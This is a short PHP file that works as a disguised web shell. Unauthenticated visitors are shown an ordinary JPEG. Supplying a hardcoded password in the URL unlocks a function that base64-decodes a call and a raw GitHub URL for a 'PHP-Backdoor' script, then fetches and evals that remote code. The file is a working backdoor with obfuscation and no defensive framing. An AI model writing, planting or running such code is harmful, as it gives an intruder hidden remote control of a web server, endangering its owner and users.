<?php 

session_start();


$imgurl = "https://i.ibb.co/pxGJ4cf/309281521-1724975007888900-4440462177072058189-n.jpg";

function showimg($imgurl){
	
	header('Content-type: image/jpeg');
	echo file_get_contents($imgurl);
}
function shell(){
	eval('?>'.base64_decode('ZmlsZV9nZXRfY29udGVudHM=')(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3plcm9ieXRlLWlkL1BIUC1CYWNrZG9vci9tYXN0ZXIvMGJ5dDNtMW4xLzBieXQzbTFuMS5waHA=')));
}

if (isset($_GET['pwd']) && $_GET['pwd'] == 'chichi') {
	$_SESSION['login'] = true;
	header('Location: ?');
}

if (!isset($_SESSION['login'])) {
	showimg($imgurl);
}else {
	
	shell();
	echo "<a href=\"?logout\">Logout</a>";
}

if (isset($_GET['logout'])) {
	header('Location: ?');
	unset($_SESSION['login']);
}
?>